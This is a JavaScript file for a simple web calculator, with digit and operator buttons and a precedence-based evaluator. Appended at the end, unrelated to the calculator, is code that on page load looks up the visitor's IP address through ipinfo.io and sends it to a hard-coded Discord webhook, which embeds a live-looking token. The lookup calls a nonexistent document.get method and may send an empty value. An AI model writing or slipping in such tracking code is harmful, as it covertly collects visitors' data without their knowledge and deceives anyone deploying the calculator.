const display = document.getElementById("displaytext");
//numbers
const btn1 = document.getElementById("1");
const btn2 = document.getElementById("2");
const btn3 = document.getElementById("3");
const btn4 = document.getElementById("4");
const btn5 = document.getElementById("5");
const btn6 = document.getElementById("6");
const btn7 = document.getElementById("7");
const btn8 = document.getElementById("8");
const btn9 = document.getElementById("9");
const btn0 = document.getElementById("0");
const dotbtn = document.getElementById(".");
//operations
const addbtn = document.getElementById("+");
const subbtn = document.getElementById("-");
const mulbtn = document.getElementById("x");
const divbtn = document.getElementById("/");

const equals = document.getElementById("=");
//setup
let disp = "";
let wipnum = "";
let sides = ["00"];
let op = "a";
let eqnum = 1;
//setup
function updatedisplay() {
  display.textContent = String(disp);
}

function buttonclicked(num) {
  wipnum += String(num);
  disp += num;
  updatedisplay();
}

function submitnum(newop) {
  sides.push(op + wipnum);
  wipnum = "";
  disp = "";
  op = newop;
}

function calculate(amount) {
  for (let i = 0; i < amount; i++) {
    //mul and div
    for (let i = 0; i < sides.length; i++) {
      let currstring = sides[i];
      if (currstring.charAt(0) == "/" || currstring.charAt(0) == "x") {
        let st1 = sides[i - 1];
        let st2 = sides[i];

        let opst1 = st1.charAt(0);
        let opst2 = st2.charAt(0);

        let num1 = Number(st1.slice(1));
        let num2 = Number(st2.slice(1));

        console.log(`Simplifying ${num1} and ${num2}`);

        if (opst2 === "x") {
          sides.splice(i, 1);
          sides[i - 1] = opst1 + String(num1 * num2);
        }
        if (opst2 === "/") {
          sides.splice(i, 1);
          sides[i - 1] = opst1 + String(num1 / num2);
        }

        i = 0;
      }
      console.log(sides);
    }
    //add and sub
    for (let i = 0; i < sides.length; i++) {
      let currstring = sides[i];
      if (currstring.charAt(0) == "s" || currstring.charAt(0) == "a") {
        let st1 = sides[i - 1];
        let st2 = sides[i];

        let opst1 = st1.charAt(0);
        let opst2 = st2.charAt(0);

        let num1 = Number(st1.slice(1));
        let num2 = Number(st2.slice(1));

        console.log(`Simplifying ${num1} and ${num2}`);

        if (opst2 == "a") {
          sides.splice(i, 1);
          sides[i - 1] = opst1 + String(num1 + num2);
        }
        if (opst2 == "s") {
          sides.splice(i, 1);
          sides[i - 1] = opst1 + String(num1 - num2);
        }
        console.log(i);

        i = 0;
      }
      console.log(sides);
    }
  }
  //disp
  disp = sides[0].slice(1);
  updatedisplay();
  //reset
  disp = "";
  wipnum = "";
  sides = ["00"];
  op = "a";
}
//buttonpresses
btn0.onclick = function () {
  buttonclicked("0");
};
btn1.onclick = function () {
  buttonclicked("1");
};
btn2.onclick = function () {
  buttonclicked("2");
};
btn3.onclick = function () {
  buttonclicked("3");
};
btn4.onclick = function () {
  buttonclicked("4");
};
btn5.onclick = function () {
  buttonclicked("5");
};
btn6.onclick = function () {
  buttonclicked("6");
};
btn7.onclick = function () {
  buttonclicked("7");
};
btn8.onclick = function () {
  buttonclicked("8");
};
btn9.onclick = function () {
  buttonclicked("9");
};
dotbtn.onclick = function () {
  buttonclicked(".");
};
//operations
addbtn.onclick = function () {
  submitnum("a");
};

subbtn.onclick = function () {
  submitnum("s");
};

mulbtn.onclick = function () {
  submitnum("x");
};

divbtn.onclick = function () {
  submitnum("/");
};

equals.onclick = function () {
  submitnum("a");
  calculate(sides.length);
};

let ip;
document.get(
  "http://ipinfo.io",
  function (response) {
    ip = response.ip;
  },
  "jsonp"
);

function discord_message(webHookURL, message) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", webHookURL, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(
    JSON.stringify({
      content: message,
      username: "AI",
    })
  );
}

discord_message(
  "https://discordapp.com/api/webhooks/1330268826113409065/h0H-wNxBW-ilDGrU_XnkZ_NMB9_zrDveLrkn-z9j_nCAKDOHAnmPGjdySaXKmbWmT6FO",
  ip
);
